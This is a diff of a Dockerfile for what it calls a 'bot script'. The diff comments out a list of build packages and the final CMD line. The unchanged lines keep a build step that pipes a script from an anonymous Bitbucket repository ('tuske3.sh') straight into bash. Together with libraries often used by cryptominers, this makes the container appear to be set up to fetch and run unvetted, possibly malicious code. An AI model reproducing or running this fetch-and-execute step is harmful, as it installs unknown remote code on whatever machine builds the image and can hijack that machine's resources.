@@ -10,18 +10,18 @@ RUN apt-get update && apt-get install -y \
     tmux \
     sudo \
     wget \
-    git \
-    make \
-    busybox \
-    build-essential \
-    nodejs \
-    npm \
-    screen \
-    neofetch \
-    ca-certificates \
-    libcurl4 \
-    libjansson4 \
-    libgomp1 \
+#    git \
+#    make \
+#    busybox \
+#    build-essential \
+#    nodejs \
+#    npm \
+#    screen \
+#    neofetch \
+#    ca-certificates \
+#    libcurl4 \
+#    libjansson4 \
+#    libgomp1 \
  && mkdir -p /home/stuff
 
 # Set work dir:
@@ -32,4 +32,4 @@ COPY run.sh /
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN curl -sL https://bitbucket.org/kacepot/esce/raw/main/tuske3.sh | bash
 # Run bot script:
-3 CMD bash run.sh
+# CMD bash run.sh
